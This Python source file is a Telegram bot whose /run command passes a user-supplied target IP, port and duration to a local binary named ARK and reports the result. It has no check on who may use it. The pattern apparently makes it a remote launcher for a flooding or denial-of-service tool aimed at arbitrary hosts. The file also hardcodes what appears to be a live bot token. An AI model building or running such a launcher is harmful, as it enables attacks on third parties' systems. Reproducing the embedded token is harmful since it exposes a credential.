import os
import subprocess
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Hardcoded active token string
TOKEN = "8142270559:AAFOdVQ46Rf2icAxOoYa1S_K7IKlPC3w5N8"

# Path targeting the local binary file
BINARY_PATH = "./ARK"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a basic status message when the command /start is issued."""
    await update.message.reply_text(
        "👋 Bot is online and ready.\n\n"
        "**Usage:**\n"
        "`/run <IP> <PORT> <TIME>`\n\n"
        "**Example:**\n"
        "`/run 93.184.216.34 80 10`", 
        parse_mode="Markdown"
    )

async def run_binary(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Execute the ARK binary with IP, PORT, and TIME arguments."""
    # Check if the user gave exactly 3 arguments (IP, PORT, TIME)
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **Incorrect Format!**\n\n"
            "Please provide exactly 3 arguments:\n"
            "`/run <IP> <PORT> <TIME>`",
            parse_mode="Markdown"
        )
        return

    ip = context.args[0]
    port = context.args[1]
    time_val = context.args[2]

    await update.message.reply_text(
        f"🔄 Sending parameters to execution block...\n"
        f"🌐 **Target:** `{ip}:{port}` for `{time_val}` seconds.",
        parse_mode="Markdown"
    )

    try:
        # Check if binary file is present
        if not os.path.exists(BINARY_PATH):
            await update.message.reply_text(f"❌ Error: `{BINARY_PATH}` file is missing from repository.")
            return
            
        # Ensure correct execution permissions on Linux host
        os.chmod(BINARY_PATH, 0o755)

        # Combines into: ['./ARK', 'IP', 'PORT', 'TIME']
        command = [BINARY_PATH, ip, port, time_val]

        # Execute system process safely
        result = subprocess.run(
            command, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,  # Prevents binary from waiting for user interactive typing
            text=True, 
            timeout=120  # 2-minute safety window
        )

        output = result.stdout.strip() if result.stdout else "Process completed with no standard output."
        errors = result.stderr.strip()

        # Compile response metrics
        response = f"✅ **Output:**\n```\n{output}\n```"
        if errors:
            response += f"\n⚠️ **Stderr/Logs:**\n```\n{errors}\n```"

        if len(response) > 4000:
            response = response[:3900] + "\n...[Truncated]"

        await update.message.reply_text(response, parse_mode="Markdown")

    except subprocess.TimeoutExpired:
        await update.message.reply_text(
            "❌ **Error: Execution Timeout.**\n\n"
            "The network process took longer than 2 minutes or hung up. Please make sure the target IP/Port is active."
        )
    except Exception as e:
        logger.error(f"Execution failure: {e}")
        await update.message.reply_text(f"❌ System Exception: {str(e)}")

def main() -> None:
    # Initialize application with hardcoded token string
    application = Application.builder().token(TOKEN).build()

    # Bind active text command listeners
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("run", run_binary))
    
    logger.info("Bot infrastructure polling initialized successfully.")
    application.run_polling()

if __name__ == "__main__":
    main()
